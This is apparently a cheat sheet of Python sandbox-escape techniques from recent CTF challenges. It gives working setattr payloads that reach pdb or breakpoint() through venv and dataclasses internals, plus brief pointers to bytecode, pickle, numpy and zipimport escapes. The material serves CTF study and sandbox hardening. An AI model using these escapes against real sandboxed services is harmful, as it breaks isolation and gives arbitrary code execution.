# 2025-2026 CTF Pyjail New Techniques (from pyjail-collection)

### Python 3.13+ setattr Jail (HITCON CTF 2025 simp)
3-line jail: `while True: mod, attr, value = input('>>> ').split(' '); setattr(__import__(mod), attr, value)`

**Escape 1 — venv module import execution**:
```python
setattr(__import__("sys"), "argv", "xx")
setattr(__import__("sys"), "_base_executable", "/usr/local/lib/python3.13/pdb.py")
setattr(__import__("venv.__main__"), "x", "x")  # venv.__main__ has no if __name__ guard
```

**Escape 2 — dataclasses + pstats code injection via `\r`**:
```python
setattr(__import__("dataclasses"), "_FIELDS", "x\rbreakpoint()\rdef\tfoo():#")
setattr(__import__("dataclasses"), "_POST_INIT_NAME", "x\rbreakpoint()\rdef\tfoo():#")
setattr(__import__("pstats"), "x", "x")  # import triggers dataclasses processing
```

### Python 3.14 `__code__` bytecode overwrite (LACTF 2025 snecko's lair)
Overwrite `__code__` bytecode of `evaluate_value` in 3.14+ `TypeAliasType`.

### gc module flag recovery (Srdnlen CTF 2025 Another Impossible Escape)
Use `gc.get_objects()` to recover deleted flag variable.

### numpy `genfromtxt` abuse (KalmarCTF 2025 Paper Viper)
numpy `genfromtxt` can execute arbitrary code through crafted CSV.

### zipimporter abuse (UIUCTF 2025 Comments Only)
Python3 detecting file as zip and running it (zipimporter).

### pickle/cpickle divergence (DiceCTF 2026 yaps)
pickle/cpickle memo divergence in py3.15+ because of dict/array memo in cpickle.

### COPY opcode OOB (DiceCTF 2026 pytecoding)
Bytecode golf with COPY out of bounds.

### b01lers CTF 2025 new jails
- **shakespearejail**: Shakespeare programming language jail
- **emacs-jail**: Emacs Lisp jail
- **prismatic/monochromatic**: Color-space encoding puzzles
- **`/>>=jail`**: New constraint jail format
